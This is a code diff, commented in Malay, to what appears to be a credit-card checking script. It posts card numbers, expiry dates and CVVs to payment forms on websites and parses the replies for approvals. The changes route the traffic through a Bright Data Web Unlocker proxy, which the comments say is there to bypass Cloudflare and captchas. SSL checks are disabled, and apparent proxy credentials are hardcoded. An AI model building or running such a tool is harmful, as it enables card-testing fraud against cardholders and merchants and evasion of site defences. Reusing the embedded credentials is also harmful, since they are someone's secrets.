@@ -28,7 +28,7 @@ class Colors:
 logging.basicConfig(level=logging.INFO, format='%(message)s', datefmt='%H:%M:%S')
 
 VALID_YEARS = list(range(2025, 2036))
-TIMEOUT_SECONDS = 30
+TIMEOUT_SECONDS = 45 # Bright Data Web Unlocker mungkin ambil sikit lama untuk bypass
 
 class IgnoreSSLAdapter(requests.adapters.HTTPAdapter):
     def init_poolmanager(self, *args, **kwargs):
@@ -76,25 +76,33 @@ def get_card_type(ccnum):
     elif ccnum.startswith('6'): return "Discover"
     return "Unknown"
 
-def create_brightdata_session():
+def create_session(proxy_url=None):
     session = requests.Session()
     session.mount('https://', IgnoreSSLAdapter())
     session.mount('http://', IgnoreSSLAdapter())
     
-    # Setup Proxy Bright Data Web Unlocker
-    host = os.environ.get("BRIGHTDATA_HOST", "brd-customer.com")
-    password = os.environ.get("BRIGHTDATA_PASS", "password")
+    # Setup Bright Data Web Unlocker Proxy
+    bd_user = os.environ.get("BRIGHTDATA_USERNAME", "brd-customer-hl_e3d7b03f-zone-web_unlocker1")
+    bd_pass = os.environ.get("BRIGHTDATA_PASSWORD", "nlxp7dqlf4r1")
+    bd_host = "brd.superproxy.io"
+    bd_port = "33335"
     
-    proxy_url = f"http:{host}:{password}@brd.superproxy.io:22225"
-    session.proxies = {"http": proxy_url, "https": proxy_url}
+    brightdata_proxy = f"http://{bd_user}:{bd_pass}@{bd_host}:{bd_port}"
     
-    # Header Web Unlocker untuk trigger bypass cloudflare + captcha
-    session.headers.update({
+    # Kita override parameter proxy kalau ada, sebab Web Unlocker kena guna dia punya proxy sendiri
+    session.proxies = {"http": brightdata_proxy, "https": brightdata_proxy}
+    
+    headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
-    })
+        "Upgrade-Insecure-Requests": "1",
+        "Cache-Control": "max-age=0"
+    }
+        
+    session.headers.update(headers)
         
     return session
 
@@ -246,7 +254,7 @@ def parse_response(html, url):
     return {'approved': False, 'has_msg': False, 'message': 'Transaction declined (No specific reason found)', 'clean_response': 'No specific reason found'}
 
 def process_site_for_payload(url):
-    session = create_brightdata_session()
+    session = create_session()
     qfkey, form_action, payload, has_authorize, err_msg = get_form_action_and_payload(session, url)
     
     if err_msg != "OK":
@@ -466,6 +474,7 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv):
                 "Upgrade-Insecure-Requests": "1"
             })
 
+            # Kiranya hantar data CC melalui Bright Data jugak
             response = session.post(form_action, data=clean_initial, timeout=45, allow_redirects=True)
 
             soup_resp = BeautifulSoup(response.text, 'html.parser')
